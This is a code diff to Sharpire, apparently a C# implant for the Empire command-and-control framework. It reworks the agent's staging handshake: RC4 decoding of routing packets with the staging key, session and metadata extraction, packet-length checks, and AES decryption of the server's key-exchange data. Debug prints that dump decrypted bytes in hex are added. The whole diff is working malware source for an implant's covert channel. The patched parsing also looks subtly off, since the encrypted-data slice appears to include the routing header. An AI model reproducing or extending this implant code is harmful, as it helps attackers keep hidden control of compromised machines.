@@ -267,14 +267,10 @@ namespace Sharpire
 
             // Receive Server Response
             RoutingPacket packet = DecodeRoutingPacket(response);
-            if (packet == null || packet.DecryptedData.Length == 0)
-            {
-                Console.WriteLine("Failed to decode routing packet.");
-                return null;
-            }
+            this.sessionInfo.SetAgentID(packet.SessionId);
 
             // Extract and Generate Shared Secret
-            byte[] decryptedData = AesDecryptAndVerify(stagingKeyBytes, packet.DecryptedData);
+            byte[] decryptedData = AesDecryptAndVerify(stagingKeyBytes, packet.EncryptedData);
             byte[] nonce = decryptedData.Take(16).ToArray();
             byte[] serverPubKey = decryptedData.Skip(16).ToArray();
 
@@ -283,7 +279,6 @@ namespace Sharpire
 
             return nonce;
         }
-
 
         private RoutingPacket DecodeRoutingPacket(byte[] packetData)
         {
@@ -294,6 +289,7 @@ namespace Sharpire
             }
 
             int offset = 0;
+
             while (offset < packetData.Length)
             {
                 byte[] routingPacket = packetData.Skip(offset).Take(20).ToArray();
@@ -304,9 +300,14 @@ namespace Sharpire
                 byte[] stagingKey = sessionInfo.GetStagingKeyBytes();
                 byte[] rc4Key = Misc.combine(routingInitializationVector, stagingKey);
 
+                Console.WriteLine($"Full Packet Data Length: {packetData.Length}");
+                Console.WriteLine($"Encrypted Data Length: {routingEncryptedData.Length}");
                 Console.WriteLine($"RC4 Key Length: {rc4Key.Length}");
 
+                // ✅ Decrypt the first 20 bytes using RC4
                 byte[] routingData = EmpireStager.rc4Encrypt(rc4Key, routingEncryptedData);
+                Console.WriteLine($"Decrypted Routing Data Length: {routingData.Length}");
+                Console.WriteLine("Decrypted Routing Data (Hex): " + BitConverter.ToString(routingData.Take(32).ToArray()));
 
                 if (routingData.Length < 16)
                 {
@@ -314,33 +315,31 @@ namespace Sharpire
                     return null;
                 }
 
+                // ✅ Extract fields from the decrypted Routing Data
                 string packetSessionId = Encoding.UTF8.GetString(routingData.Take(8).ToArray());
 
-                byte language = 0;
-                byte metaData = 0;
-                try
-                {
-                    language = routingPacket[8];
-                    metaData = routingPacket[9];
-                }
-                catch (IndexOutOfRangeException)
-                {
-                }
-
-                byte[] extra = routingPacket.Skip(10).Take(2).ToArray();
+                byte language = routingData[8];
+                byte metaData = routingData[9];
+                byte[] extra = routingData.Skip(10).Take(2).ToArray();
                 uint packetLength = BitConverter.ToUInt32(routingData, 12);
+                Console.WriteLine($"Extracted Packet Length: {packetLength}");
 
-                if (packetLength == 0)
+                if (packetLength == 0 || packetLength > packetData.Length - offset)
                 {
                     Console.WriteLine("Invalid packet length.");
                     return null;
                 }
 
+                // ✅ Extract the remaining **AES-encrypted** data
+                byte[] encryptedData = packetData.Skip(offset).Take((int)packetLength).ToArray();
+                Console.WriteLine($"Extracted Encrypted Data Length: {encryptedData.Length}");
+                
+
                 return new RoutingPacket
                 {
                     InitializationVector = routingInitializationVector,
-                    EncryptedData = routingEncryptedData,
-                    DecryptedData = routingData,
+                    EncryptedData = encryptedData,
+                    DecryptedData = null,
                     SessionId = packetSessionId,
                     Language = language,
                     MetaData = metaData,
@@ -351,6 +350,7 @@ namespace Sharpire
 
             return null;
         }
+
 
         ////////////////////////////////////////////////////////////////////////////////
         //
@@ -642,6 +642,7 @@ namespace Sharpire
             using (AesCryptoServiceProvider aesCrypto = new AesCryptoServiceProvider())
             {
                 aesCrypto.Mode = CipherMode.CBC;
+                aesCrypto.Padding = PaddingMode.PKCS7;
                 aesCrypto.Key = key;
                 aesCrypto.IV = iv;
                 return aesCrypto.CreateDecryptor().TransformFinalBlock(cipherText, 0, cipherText.Length);
